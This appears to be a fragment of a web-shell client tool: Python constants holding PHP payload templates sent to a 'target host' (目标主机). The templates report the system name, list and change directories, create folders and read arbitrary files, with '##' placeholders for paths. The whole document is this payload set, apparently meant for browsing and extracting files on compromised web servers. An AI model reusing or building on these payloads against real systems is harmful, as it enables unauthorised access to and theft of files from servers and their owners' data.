PHP_fileBaseCode='''echo "\n目标主机系统:";echo php_uname('s');'''
PHP_GETDIR = '''$handle=opendir('.');\
        echo "\n目录:----------------------\n";\
        while($file = readdir($handle)){echo "$file\n";}closedir($handle);'''
PHP_GETPATH = '''echo getcwd();'''
PHP_MKDIR = '''mkdir("##/");'''
PHP_CD = '''chdir("##/");'''

PHP_READ = '''$ff=fopen("##","r");if(!$ff){echo "<br />加载失败 或无此文件<br />";\
        exit;}while(!feof($ff)){echo fgets($ff,256);}fclose($ff);'''
PHP_test = '''$ff=fopen("newfile.txt","r");echo fgets($ff,1024);'''

